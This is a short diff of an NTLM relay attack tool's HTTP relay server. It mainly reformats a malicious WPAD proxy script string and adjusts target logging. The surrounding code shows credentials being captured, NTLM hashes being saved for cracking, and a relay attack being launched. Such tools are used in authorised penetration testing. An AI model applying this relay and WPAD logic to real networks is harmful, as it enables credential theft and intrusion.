@@ -52,7 +52,9 @@ class HTTPRelayServer(Thread):
             self.machineHashes = None
             self.domainIp = None
             self.authUser = None
-            self.wpad = 'function FindProxyForURL(url, host){if ((host == "localhost") || shExpMatch(host, "localhost.*") ||(host == "127.0.0.1")) return "DIRECT"; if (dnsDomainIs(host, "%s")) return "DIRECT"; return "PROXY %s:80; DIRECT";} '
+            self.wpad = 'function FindProxyForURL(url, host){if ((host == "localhost") || shExpMatch(host, "localhost.*") ||' \
+                        '(host == "127.0.0.1")) return "DIRECT"; if (dnsDomainIs(host, "%s")) return "DIRECT"; ' \
+                        'return "PROXY %s:80; DIRECT";} '
             if self.server.config.mode != 'REDIRECT':
                 if self.server.config.target is None:
                     # Reflection mode, defaults to SMB at the target, for now
@@ -215,7 +217,8 @@ class HTTPRelayServer(Thread):
                             authenticateMessage['domain_name'].decode('ascii'),
                             authenticateMessage['user_name'].decode('ascii')))
 
-                    # Only skip to next if the login actually failed, not if it was just anonymous login or a system account which we don't want
+                    # Only skip to next if the login actually failed, not if it was just anonymous login or a system account
+                    # which we don't want
                     if authenticateMessage['user_name'] != '': # and authenticateMessage['user_name'][-1] != '$':
                         self.server.config.target.logTarget(self.target)
                         # No anonymous login, go to next host and avoid triggering a popup
@@ -243,7 +246,7 @@ class HTTPRelayServer(Thread):
                     if self.server.config.outputFile is not None:
                         writeJohnOutputToFile(ntlm_hash_data['hash_string'], ntlm_hash_data['hash_version'], self.server.config.outputFile)
 
-                    self.server.config.target.logTarget(self.target)
+                    self.server.config.target.logTarget(self.target, True, self.authUser)
 
                     self.do_attack()
 
